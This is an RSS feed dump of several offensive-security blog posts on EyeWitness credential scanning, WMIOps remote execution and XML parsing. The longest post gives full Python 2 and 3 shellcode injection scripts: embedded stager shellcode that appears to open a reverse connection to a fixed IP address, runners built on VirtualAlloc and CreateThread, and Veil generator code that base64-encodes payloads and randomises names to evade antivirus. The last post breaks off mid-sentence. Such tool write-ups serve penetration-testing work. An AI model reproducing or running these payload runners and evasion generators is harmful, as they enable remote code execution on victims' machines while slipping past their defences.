{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"EyeWitness and Active Scanning","link":"https://www.christophertruncer.com/?p=1249","description":"<p>You can clone/download EyeWitness to test active scans here: <a href=\"https://github.com/ChrisTruncer/EyeWitness\">https://github.com/ChrisTruncer/EyeWitness</a></p>\n<p>Since its release, EyeWitness has purely been a passive scanner. Its focus has been to take screenshots of web applications, and attempt to identify any default credentials that might be associated with that web application. In my experience, it works well to save me the time from having to look up account information. While there are other features, this has been EyeWitness&#8217;s primary MO.</p>\n<p>For a while, it&#8217;s been requested that EyeWitness integrate active scanning features to actually test and see what user accounts are genuinely valid, but it&#8217;s just never been in EyeWitness&#8217;s functionality.. until now.</p>\n<p>Evan Pena (<a href=\"https://twitter.com/evan_pena2003\">@Evan_Pena2003</a>) just submitted a <a href=\"https://github.com/ChrisTruncer/EyeWitness/pull/191\">pull request</a> to EyeWitness which has just been merged into the master branch. While it is currently limited in scope, active user account scanning functionality has just been merged into EyeWitness!</p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/scan.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1255\" src=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/scan.png\" alt=\"scan\" width=\"1602\" height=\"818\" /></a></p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/raikia.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1259\" src=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/raikia.png\" alt=\"raikia\" width=\"1595\" height=\"572\" /></a></p>\n<p>When you use the &#8211;active-scan command line flag, EyeWitness will attempt to find common locations of login forms, and if one is found, it will attempt to validate commonly used credentials and see if they work for the specific web application being tested. Additionally, we are now able to create more targeted &#8220;signatures&#8221; that can be used to specify paths for each unique web application and the credentials that should be tested against it.</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"Datafile Creds.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/Datafile-Creds.png\" alt=\"Datafile Creds\" width=\"557\" height=\"433\" border=\"0\" /></p>\n<p>For example, the &#8211;active-scan feature now can test tomcat manager web applications with various username and password combinations to see if any are valid. If a valid user/pass combo is found, EyeWitness will not only alert within the console, but the report itself has a new category called &#8220;Successful Logins&#8221; to highlight the applications where EyeWitness could successfully log into it.</p>\n<p><a href=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/Raikiareport.png\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1261\" src=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/Raikiareport.png\" alt=\"Raikiareport\" width=\"2833\" height=\"1473\" /></a></p>\n<p>As of now, the &#8220;database&#8221; of web applications isn&#8217;t large. However, this is the same situation we were in when EyeWitness began passively scanning for default credentials. As the database is built out, I&#8217;ll have the ability to add more web applications in and identify more credentials for each web app.</p>\n<p>I&#8217;m really happy to have had this feature added in from the community, and I look forward to adding to the web application database and identify more credentials with each scan.</p>\n","descriptionType":"html","publishedDate":"Thu, 26 May 2016 15:37:31 +0000","feedId":11878,"bgimg":"https://www.christophertruncer.com/wp-content/uploads/2016/05/scan.png","linkMd5":"4e8722bf7c8e9c9510e0bca68e48d09c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn11@2020_1/2020/08/25/01-41-06-920_7c6addcb046d0a0a.webp","destWidth":1602,"destHeight":818,"sourceBytes":100457,"destBytes":96296,"author":"Christopher Truncer","articleImgCdnMap":{"https://www.christophertruncer.com/wp-content/uploads/2016/05/scan.png":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn11@2020_1/2020/08/25/01-41-06-920_7c6addcb046d0a0a.webp","https://www.christophertruncer.com/wp-content/uploads/2016/05/raikia.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn63@2020_3/2020/08/25/01-41-33-760_6a9577c1b880b096.webp","https://www.christophertruncer.com/wp-content/uploads/2016/05/Datafile-Creds.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn68@2020_5/2020/08/25/01-41-34-621_5973096dc2b6bfa9.webp","https://www.christophertruncer.com/wp-content/uploads/2016/05/Raikiareport.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn76@2020_5/2020/08/25/01-41-33-957_a2c0b25feace5940.webp"},"publishedOrCreatedDate":1598319666307},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"Shellcode Generation, Manipulation, and Injection in Python 3","link":"https://www.christophertruncer.com/?p=1331","description":"<p>It&#8217;s no secret that I&#8217;ve been working on updating Veil and will soon be releasing Veil 3.0. In the process, I&#8217;ve learned quite a bit about Python 2 and 3. Veil-Evasion was developed in Python 2 and after attempting to recreate some of the same capabilities in Python 3, I&#8217;ve learned how &#8220;loose&#8221; Python 2 can be. We were able to get away with various commands where Python 3 explicitly requires us to define what is being done.</p>\n<p>Want to see how shellcode injection works in Python 2.0? Here&#8217;s a sample Python 2 flat script which includes no obfuscation:</p>\n<pre class=\"brush: python; title: ; notranslate\">\nEUPnBcpNWMwGi = bytearray('\\xfc\\xe8\\x86\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x8b\\x4c\\x10\\x78\\xe3\\x4a\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x89\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x09\\x68\\xc0\\xa8\\xa2\\x91\\x68\\x02\\x00\\x21\\xe3\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\\x85\\xf6\\x75\\xec\\xc3')\nimport ctypes as ZKWXnIdQAuP\nVjdMidBttQlbLnR = ZKWXnIdQAuP.windll.kernel32.VirtualAlloc(ZKWXnIdQAuP.c_int(0),ZKWXnIdQAuP.c_int(len(EUPnBcpNWMwGi)),ZKWXnIdQAuP.c_int(0x3000),ZKWXnIdQAuP.c_int(0x40))\nWgHYTWhElnnZ = (ZKWXnIdQAuP.c_char * len(EUPnBcpNWMwGi)).from_buffer(EUPnBcpNWMwGi)\nZKWXnIdQAuP.windll.kernel32.RtlMoveMemory(ZKWXnIdQAuP.c_int(VjdMidBttQlbLnR),WgHYTWhElnnZ,ZKWXnIdQAuP.c_int(len(EUPnBcpNWMwGi)))\nIaoYNg = ZKWXnIdQAuP.windll.kernel32.CreateThread(ZKWXnIdQAuP.c_int(0),ZKWXnIdQAuP.c_int(0),ZKWXnIdQAuP.c_int(VjdMidBttQlbLnR),ZKWXnIdQAuP.c_int(0),ZKWXnIdQAuP.c_int(0),ZKWXnIdQAuP.pointer(ZKWXnIdQAuP.c_int(0)))\nZKWXnIdQAuP.windll.kernel32.WaitForSingleObject(ZKWXnIdQAuP.c_int(IaoYNg),ZKWXnIdQAuP.c_int(-1))\n</pre>\n<p>And now, here&#8217;s the same script written for Python 3:</p>\n<pre class=\"brush: python; title: ; notranslate\">\nimport ctypes as bDlDmsfMyuV\nmiiJDEKLsxLjbM = b'\\xfc\\xe8\\x86\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7\\xe2\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x8b\\x4c\\x10\\x78\\xe3\\x4a\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b\\x12\\xeb\\x89\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x09\\x68\\xc0\\xa8\\xa2\\x91\\x68\\x02\\x00\\x21\\xe3\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x6a\\x00\\x6a\\x04\\x56\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x8b\\x36\\x6a\\x40\\x68\\x00\\x10\\x00\\x00\\x56\\x6a\\x00\\x68\\x58\\xa4\\x53\\xe5\\xff\\xd5\\x93\\x53\\x6a\\x00\\x56\\x53\\x57\\x68\\x02\\xd9\\xc8\\x5f\\xff\\xd5\\x01\\xc3\\x29\\xc6\\x85\\xf6\\x75\\xec\\xc3'\nwiseZERld = bDlDmsfMyuV.windll.kernel32.VirtualAlloc(bDlDmsfMyuV.c_int(0),bDlDmsfMyuV.c_int(len(miiJDEKLsxLjbM)),bDlDmsfMyuV.c_int(0x3000),bDlDmsfMyuV.c_int(0x40))\nbDlDmsfMyuV.windll.kernel32.RtlMoveMemory(bDlDmsfMyuV.c_int(wiseZERld),miiJDEKLsxLjbM,bDlDmsfMyuV.c_int(len(miiJDEKLsxLjbM)))\nCVXWRcjqxL = bDlDmsfMyuV.windll.kernel32.CreateThread(bDlDmsfMyuV.c_int(0),bDlDmsfMyuV.c_int(0),bDlDmsfMyuV.c_int(wiseZERld),bDlDmsfMyuV.c_int(0),bDlDmsfMyuV.c_int(0),bDlDmsfMyuV.pointer(bDlDmsfMyuV.c_int(0)))\nbDlDmsfMyuV.windll.kernel32.WaitForSingleObject(bDlDmsfMyuV.c_int(CVXWRcjqxL),bDlDmsfMyuV.c_int(-1))\n</pre>\n<p>You can see there is a difference in how the shellcode is being handled. In Python 2, I&#8217;m storing the shellcode as a bytearray, vs. Python 3 it&#8217;s stored as bytes. This isn&#8217;t a huge difference, but a larger change can be seen when manipulating shellcode, such as storing it in a base64 decoding script.</p>\n<p>This is how I am able to generate shellcode and base64 encode it to be decoded at runtime in a script in Python 2:</p>\n<pre class=\"brush: python; title: ; notranslate\">\n# Generate Shellcode Using msfvenom\nShellcode = self.shellcode.generate(self.required_options)\n\n# Base64 Encode Shellcode\nEncodedShellcode = base64.b64encode(Shellcode)\n\n# Generate Random Variable Names\nShellcodeVariableName = helpers.randomString()\nRandPtr = helpers.randomString()\nRandBuf = helpers.randomString()\nRandHt = helpers.randomString()\nRandT = helpers.randomString()\nrandctypes = helpers.randomString()\n\nPayloadCode = 'import ctypes as ' + randctypes + '\\n'\nPayloadCode += 'import base64\\n'\nPayloadCode += RandT + &#34; = \\&#34;&#34; + EncodedShellcode + &#34;\\&#34;\\n&#34;\nPayloadCode += ShellcodeVariableName + &#34; = bytearray(&#34; + RandT + &#34;.decode('base64','strict').decode(\\&#34;string_escape\\&#34;))\\n&#34;\nPayloadCode += RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\\n'\nPayloadCode += RandBuf + ' = (' + randctypes + '.c_char * len(' + ShellcodeVariableName  + ')).from_buffer(' + ShellcodeVariableName + ')\\n'\nPayloadCode += randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + RandBuf + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\\n'\nPayloadCode += RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\\n'\nPayloadCode += randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\\n'\n\nif self.required_options[&#34;USE_PYHERION&#34;][0].lower() == &#34;y&#34;:\n    PayloadCode = encryption.pyherion(PayloadCode)\n\nreturn PayloadCode\n</pre>\n<p>At line 2, we&#8217;re receiving a string which essentially contains shellcode similar to &#8216;\\x41\\x7d\\x00\\x0a&#8230;&#8217;. This string is encoded, and then stored in output payload code. The code which this module creates looks like this:</p>\n<pre class=\"brush: python; title: ; notranslate\">\nimport ctypes as rLkdwnPpzMBnJr\nimport base64\nIesGKFkNFMC = &#34;XHhmY1x4ZThceDg2XHgwMFx4MDBceDAwXHg2MFx4ODlceGU1XHgzMVx4ZDJceDY0XHg4Ylx4NTJceDMwXHg4Ylx4NTJceDBjXHg4Ylx4NTJceDE0XHg4Ylx4NzJceDI4XHgwZlx4YjdceDRhXHgyNlx4MzFceGZmXHgzMVx4YzBceGFjXHgzY1x4NjFceDdjXHgwMlx4MmNceDIwXHhjMVx4Y2ZceDBkXHgwMVx4YzdceGUyXHhmMFx4NTJceDU3XHg4Ylx4NTJceDEwXHg4Ylx4NDJceDNjXHg4Ylx4NGNceDEwXHg3OFx4ZTNceDRhXHgwMVx4ZDFceDUxXHg4Ylx4NTlceDIwXHgwMVx4ZDNceDhiXHg0OVx4MThceGUzXHgzY1x4NDlceDhiXHgzNFx4OGJceDAxXHhkNlx4MzFceGZmXHgzMVx4YzBceGFjXHhjMVx4Y2ZceDBkXHgwMVx4YzdceDM4XHhlMFx4NzVceGY0XHgwM1x4N2RceGY4XHgzYlx4N2RceDI0XHg3NVx4ZTJceDU4XHg4Ylx4NThceDI0XHgwMVx4ZDNceDY2XHg4Ylx4MGNceDRiXHg4Ylx4NThceDFjXHgwMVx4ZDNceDhiXHgwNFx4OGJceDAxXHhkMFx4ODlceDQ0XHgyNFx4MjRceDViXHg1Ylx4NjFceDU5XHg1YVx4NTFceGZmXHhlMFx4NThceDVmXHg1YVx4OGJceDEyXHhlYlx4ODlceDVkXHg2OFx4MzNceDMyXHgwMFx4MDBceDY4XHg3N1x4NzNceDMyXHg1Zlx4NTRceDY4XHg0Y1x4NzdceDI2XHgwN1x4ZmZceGQ1XHhiOFx4OTBceDAxXHgwMFx4MDBceDI5XHhjNFx4NTRceDUwXHg2OFx4MjlceDgwXHg2Ylx4MDBceGZmXHhkNVx4NTBceDUwXHg1MFx4NTBceDQwXHg1MFx4NDBceDUwXHg2OFx4ZWFceDBmXHhkZlx4ZTBceGZmXHhkNVx4OTdceDZhXHgwOVx4NjhceGMwXHhhOFx4YTJceDkxXHg2OFx4MDJceDAwXHgyMVx4ZTNceDg5XHhlNlx4NmFceDEwXHg1Nlx4NTdceDY4XHg5OVx4YTVceDc0XHg2MVx4ZmZceGQ1XHg4NVx4YzBceDc0XHgwY1x4ZmZceDRlXHgwOFx4NzVceGVjXHg2OFx4ZjBceGI1XHhhMlx4NTZceGZmXHhkNVx4NmFceDAwXHg2YVx4MDRceDU2XHg1N1x4NjhceDAyXHhkOVx4YzhceDVmXHhmZlx4ZDVceDhiXHgzNlx4NmFceDQwXHg2OFx4MDBceDEwXHgwMFx4MDBceDU2XHg2YVx4MDBceDY4XHg1OFx4YTRceDUzXHhlNVx4ZmZceGQ1XHg5M1x4NTNceDZhXHgwMFx4NTZceDUzXHg1N1x4NjhceDAyXHhkOVx4YzhceDVmXHhmZlx4ZDVceDAxXHhjM1x4MjlceGM2XHg4NVx4ZjZceDc1XHhlY1x4YzM=&#34;\nCnnDRU = bytearray(IesGKFkNFMC.decode('base64','strict').decode(&#34;string_escape&#34;))\nusGGTaLShwINu = rLkdwnPpzMBnJr.windll.kernel32.VirtualAlloc(rLkdwnPpzMBnJr.c_int(0),rLkdwnPpzMBnJr.c_int(len(CnnDRU)),rLkdwnPpzMBnJr.c_int(0x3000),rLkdwnPpzMBnJr.c_int(0x40))\nTaEkbM = (rLkdwnPpzMBnJr.c_char * len(CnnDRU)).from_buffer(CnnDRU)\nrLkdwnPpzMBnJr.windll.kernel32.RtlMoveMemory(rLkdwnPpzMBnJr.c_int(usGGTaLShwINu),TaEkbM,rLkdwnPpzMBnJr.c_int(len(CnnDRU)))\nTuQYnf = rLkdwnPpzMBnJr.windll.kernel32.CreateThread(rLkdwnPpzMBnJr.c_int(0),rLkdwnPpzMBnJr.c_int(0),rLkdwnPpzMBnJr.c_int(usGGTaLShwINu),rLkdwnPpzMBnJr.c_int(0),rLkdwnPpzMBnJr.c_int(0),rLkdwnPpzMBnJr.pointer(rLkdwnPpzMBnJr.c_int(0)))\nrLkdwnPpzMBnJr.windll.kernel32.WaitForSingleObject(rLkdwnPpzMBnJr.c_int(TuQYnf),rLkdwnPpzMBnJr.c_int(-1))\n</pre>\n<p>This script decodes the base64 encoded string (the shellcode), and then string escapes the shellcode. After that, the escaped shellcode is injected into memory and run. Python 2 makes this fairly simple to do, Python 3, is a little more strict with the datatypes that are used.</p>\n<p>For example, this is how I am generating shellcode and encoding it prior to embedding it within a script in Python 3:</p>\n<pre class=\"brush: python; title: ; notranslate\">\n# Generate the shellcode\nShellcode = self.shellcode.generate(self.cli_opts)\nShellcode = Shellcode.encode('latin-1')\nShellcode = Shellcode.decode('unicode_escape')\n\n# Base64 Encode Shellcode\nEncodedShellcode = base64.b64encode(bytes(Shellcode, 'latin-1')).decode('ascii')\n\npayload_code = 'import ctypes as ' + randctypes + '\\n'\npayload_code += 'import base64\\n'\npayload_code += ShellcodeVariableName +' = base64.b64decode(\\&#34;' + EncodedShellcode + '\\&#34;)\\n'\npayload_code += RandPtr + ' = ' + randctypes + '.windll.kernel32.VirtualAlloc(' + randctypes + '.c_int(0),' + randctypes + '.c_int(len('+ ShellcodeVariableName +')),' + randctypes + '.c_int(0x3000),' + randctypes + '.c_int(0x40))\\n'\npayload_code += randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + RandPtr + '),' + ShellcodeVariableName + ',' + randctypes + '.c_int(len(' + ShellcodeVariableName + ')))\\n'\npayload_code += RandHt + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + RandPtr + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\\n'\npayload_code += randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + RandHt + '),' + randctypes + '.c_int(-1))\\n'\n</pre>\n<p>Immediately there&#8217;s a difference with how shellcode generation and manipulation is handled. In this case, line 2 still receives the shellcode as a string similar to &#8216;\\x41\\x7d\\x00\\x0a&#8230;&#8217;, but you can&#8217;t base64 encode a string in Python 3, it requires input to be in the form of bytes. Unfortunately, .encode() on the shellcode doesn&#8217;t properly encode the shellcode for injection later on in the script. It took a while, but with the help of <a href=\"https://twitter.com/raikiasec\">@raikiasec</a>, we were able to figure out that encoding shellcode with latin-1 formatting (.encode(&#8216;latin-1&#8217;)) allowed the string shellcode to be properly encoded.</p>\n<p>Obviously, that wasn&#8217;t the only step that needs to be taken. After encoding in &#8216;latin-1&#8217; format, the shellcode needs to be unicode escaped, and then re-encoded in latin-1 to return it to a byte format (hint: every time you .encode() something, you convert from a string to bytes. Each time you .decode() something, you convert from bytes to a string). The final latin-1 encoding is all that is needed, and then the shellcode is base64 encoded. Beyond that, Base64 encoding returns bytes, so the bytes output needs to be decoded as ascii, and then stored in the output Python script.  Once this is done, it creates a script similar to below:</p>\n<pre class=\"brush: python; title: ; notranslate\">\nimport ctypes as AKkkiwvmOTZmuXU\nimport base64\nmMgzKuJ = base64.b64decode(&#34;/OiGAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8i0wQeONKAdFRi1kgAdOLSRjjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ldaDMyAABod3MyX1RoTHcmB//VuJABAAApxFRQaCmAawD/1VBQUFBAUEBQaOoP3+D/1ZdqCWjAqKKRaAIAIeOJ5moQVldomaV0Yf/VhcB0DP9OCHXsaPC1olb/1WoAagRWV2gC2chf/9WLNmpAaAAQAABWagBoWKRT5f/Vk1NqAFZTV2gC2chf/9UBwynGhfZ17MM=&#34;)\nCOZaAf = AKkkiwvmOTZmuXU.windll.kernel32.VirtualAlloc(AKkkiwvmOTZmuXU.c_int(0),AKkkiwvmOTZmuXU.c_int(len(mMgzKuJ)),AKkkiwvmOTZmuXU.c_int(0x3000),AKkkiwvmOTZmuXU.c_int(0x40))\nAKkkiwvmOTZmuXU.windll.kernel32.RtlMoveMemory(AKkkiwvmOTZmuXU.c_int(COZaAf),mMgzKuJ,AKkkiwvmOTZmuXU.c_int(len(mMgzKuJ)))\nWzFChtFNp = AKkkiwvmOTZmuXU.windll.kernel32.CreateThread(AKkkiwvmOTZmuXU.c_int(0),AKkkiwvmOTZmuXU.c_int(0),AKkkiwvmOTZmuXU.c_int(COZaAf),AKkkiwvmOTZmuXU.c_int(0),AKkkiwvmOTZmuXU.c_int(0),AKkkiwvmOTZmuXU.pointer(AKkkiwvmOTZmuXU.c_int(0)))\nAKkkiwvmOTZmuXU.windll.kernel32.WaitForSingleObject(AKkkiwvmOTZmuXU.c_int(WzFChtFNp),AKkkiwvmOTZmuXU.c_int(-1))\n</pre>\n<p>The hardest concept for me to grasp was learning the proper encoding/decoding format that the shellcode needs to be in for the different types of manipulation that I would perform on the shellcode (base64 encoding, letter substitution, encryption, etc.). Hopefully by giving some code examples here, this can help anyone else that is looking into using Python 3 to manipulate shellcode, inject it into memory, or more.</p>\n<p>If there&#8217;s a better way to do the above, or if you have any questions, don&#8217;t hesitate to <a href=\"https://twitter.com/christruncer\">send a message my way</a>! Otherwise, be sure to check out Veil 3&#8217;s release at <a href=\"http://nullcon.net/website/goa-2017/speakers/christopher_truncer.php\">NullCon</a> and you&#8217;ll have plenty of example to look at!</p>\n","descriptionType":"html","publishedDate":"Mon, 30 Jan 2017 13:31:01 +0000","feedId":11878,"bgimg":"","linkMd5":"cfe84f83cfbb2cd14b569c41a8a9110f","bgimgJsdelivr":"","metaImg":"","author":"Christopher Truncer","publishedOrCreatedDate":1598319666307},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"EyeWitness XML Parsing Updated","link":"https://www.christophertruncer.com/?p=1243","description":"<p>Since the first release of <a href=\"https://github.com/ChrisTruncer/EyeWitness\">EyeWitness</a>, the tool has supported input formats of both text files, and XML output from Nessus and Nmap. There&#8217;s two main ways to parse XML, the Document Object Model (DOM) and Simple API for XML Parsing (SAX). The main difference is when using DOM to parse XML, the whole XML document is loaded into memory and analyzed. SAX is essentially a stream based parser and loads small pieces of the XML in memory at a time. DOM is faster at parsing XML since the entire file is loaded into memory, but this comes as a memory cost. EyeWitness has always used DOM based parsing since it is faster and I had yet to encounter a failure in parsing due to this design decision.</p>\n<p>However, I can no longer make that claim. <a href=\"https://twitter.com/viss\">Viss</a> has become my edge case (and I&#8217;m now certain that others who perform the same work/scans are as well. Also, I make this claim that he is my edge case jokingly :)). A couple months ago Viss had contacted me to let me know EyeWitness was crashing after trying to parse an XML document. This XML file was the output from (I believe) scanning the whole internet. It was a funny conversation, but showed that I needed to change how EyeWitness parses XML in order to handle these larger scans (I&#8217;m talking nearly a gig, I believe, for a single XML file).</p>\n<p>EyeWitness has now been modified to use SAX-based XML parsing. The tradeoff is that there might be <strong>slightly</strong> longer XML parsing times, but this will ensure that EyeWitness is able to parse anything you can throw at it (until someone comes with my next edge case :)). The slightly longer parsing times for XML will likely not even be noticeable for nearly all users.</p>\n<p>With this change, some small modifications to EyeWitness command line options have been added. Previously when you passed a file into EyeWitness, it would auto-detect if it is an XML file or text file, and parse accordingly. I&#8217;ve now separated the commands out, and you will either specify a file (with the -f flag) or an xml file (with the -x flag). This is now present within the help menu:</p>\n<p><img loading=\"lazy\" style=\"display: block; margin-left: auto; margin-right: auto;\" title=\"xmlparse.png\" src=\"https://www.christophertruncer.com/wp-content/uploads/2016/05/xmlparse.png\" alt=\"Xmlparse\" width=\"592\" height=\"125\" border=\"0\"></p>\n<p>This change has now been pushed into the master EyeWitness branch. If you have any questions, don&#8217;t hesitate to reach out and ask (<a href=\"https://twitter.com/christruncer\">@ChrisTruncer</a>).</p>\n<p>Thanks!</p>\n","descriptionType":"html","publishedDate":"Mon, 09 May 2016 17:40:34 +0000","feedId":11878,"bgimg":"https://www.christophertruncer.com/wp-content/uploads/2016/05/xmlparse.png","linkMd5":"3cac6fc91a04b45724f8ab9f936029df","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn16@2020_1/2020/08/25/01-41-06-787_d886cdf4f2911802.webp","destWidth":1184,"destHeight":250,"sourceBytes":34441,"destBytes":32060,"author":"Christopher Truncer","articleImgCdnMap":{"https://www.christophertruncer.com/wp-content/uploads/2016/05/xmlparse.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn16@2020_1/2020/08/25/01-41-06-787_d886cdf4f2911802.webp"},"publishedOrCreatedDate":1598319666307},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"WMIOps 1.1","link":"https://www.christophertruncer.com/?p=1200","description":"<p>After it&#8217;s initial release, I&#8217;ve had some feedback which has led to additional functionality within WMIOps, and I&#8217;ll be pushing it out in this WMIOps 1.1 release.  This release is fairly minor with two functions being added in, and an enhancement to an existing one.</p>\n<p>Github Repo: <a href=\"https://github.com/ChrisTruncer/WMIOps\">https://github.com/ChrisTruncer/WMIOps</a></p>\n<p>Some of the changes include:</p>\n<ul>\n<li><strong>Invoke-FileTransferOverWMI</strong> &#8211; This now has an &#8220;Execute&#8221; switch that can be provided on the command line.  If used, once a file has been uploaded to your target machine, the function will use WMI to execute/run the uploaded file.  This is now a different way to get code execution on a remote system vs. Invoke-CreateShareandExecute.</li>\n<li><strong>Get-SystemDrivesWMI</strong> &#8211; This function will enumerate local and network drives on the targeted system and return information about them (path, size, etc.)</li>\n<li><strong>Get-ActiveNICsWMI</strong> &#8211; This function will enumerate all network cards that the target system is using (read has an IP address).  All active connections will be returned</li>\n</ul>\n","descriptionType":"html","publishedDate":"Mon, 30 Nov 2015 17:19:46 +0000","feedId":11878,"bgimg":"","linkMd5":"49f74e0b75401ed1afb0e9e094f815cd","bgimgJsdelivr":"","metaImg":"","author":"Christopher Truncer","publishedOrCreatedDate":1598319666307},{"createdTime":"2020-08-25 09:41:06","updatedTime":"2020-08-25 09:41:06","title":"Veil-Framework and ChristopherTruncer Website Brute Force and Just-Metadata","link":"https://www.christophertruncer.com/?p=1165","description":"<p>I&#8217;ve been monitoring the logs from the Veil-Evasion and this website, and I noticed the past couple days that there&#8217;s a lot of attempts to log in to the Veil website. Seeing as I am not logging into it myself, I know that this is obviously going to be someone trying to break in. However, this isn&#8217;t an attack where the attacker is trying to remain under the radar, this is pretty 